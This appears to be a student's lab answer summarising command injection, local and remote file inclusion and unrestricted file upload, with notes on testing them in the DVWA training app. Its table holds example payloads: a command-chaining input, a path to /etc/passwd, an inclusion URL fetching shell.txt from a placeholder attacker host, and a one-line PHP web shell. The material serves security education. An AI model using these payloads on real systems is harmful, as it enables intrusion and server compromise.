# Q6: Command Injection, LFI/RFI, Unrestricted File Upload

| Vulnerability | What it is | Why it's dangerous | Example payload |
|---|---|---|---|
| Command Injection | User input is passed unsanitized into a system shell command | Allows arbitrary OS commands as the web server user, often full server compromise | `127.0.0.1; whoami` |
| Local File Inclusion (LFI) | App includes a file path from user input, letting an attacker read local files | Can leak sensitive files (configs, credentials, source code) or chain to code execution if logs can be injected | `?page=/etc/passwd` |
| Remote File Inclusion (RFI) | Same as LFI, but the app fetches and includes a remote URL as code | Attacker can run their own code on the server directly | `?page=http://[[attacker-ip]]/shell.txt` |
| Unrestricted File Upload | App accepts uploaded files without validating type/content | Attacker can upload a web shell and get code execution | A PHP file like `<?php system($_GET['cmd']); ?>` |

## How this shows up in my lab
I confirmed command injection on DVWA (`127.0.0.1; whoami` returned `www-data` at Low, and `|` bypassed the Medium-level filter). I also confirmed unrestricted file upload: a PHP web shell uploaded with no validation, and browsing to it with `?cmd=id` executed commands as `www-data`. ZAP's spider didn't find this on its own, since no alert was raised for the Upload module — I found it only through manual testing. I did not test LFI/RFI directly this week (DVWA's `fi` module showed a Path Traversal alert from ZAP reading `/etc/passwd`, which is closely related).